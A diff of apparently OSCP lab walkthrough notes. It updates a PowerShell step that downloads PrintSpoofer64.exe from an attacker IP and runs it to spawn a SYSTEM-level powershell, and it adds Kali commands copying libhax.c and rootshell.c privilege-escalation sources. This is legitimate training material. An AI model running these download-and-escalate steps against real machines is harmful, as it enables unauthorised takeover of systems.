@@ -272,7 +272,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 8. Transfer printproof64.exe and run and get system contro. 
 ```
-PS C:\users\Mary.Williams\Desktop> iwr -uri http://192.168.45.242/PrintSpoofer64.exe  -Outfile PrintSpoofer64.exe
+PS C:\users\Mary.Williams\Desktop> iwr -uri http://192.168.45.207/PrintSpoofer64.exe  -Outfile PrintSpoofer64.exe
 iwr -uri http://192.168.45.242/PrintSpoofer64.exe  -Outfile PrintSpoofer64.exe
 PS C:\users\Mary.Williams\Desktop> .\PrintSpoofer64.exe -i -c powershell.exe
 .\PrintSpoofer64.exe -i -c powershell.exe
@@ -626,6 +626,13 @@ Press ^] three times within 1s to kill container.
 root@MACHINE_NAME:~$ exit
 logout
 Container MACHINE_NAME exited successfully.
+
+┌──(root㉿kali)-[/var/lib/machines/sam/home]
+└─# cp /home/kali/OSCP/labs/oscpa/XenSpawn/libhax.c .
+                                                                  
+┌──(root㉿kali)-[/var/lib/machines/sam/home]
+└─# cp /home/kali/OSCP/labs/oscpa/XenSpawn/rootshell.c .
+
 
 4. Complies files. 
 
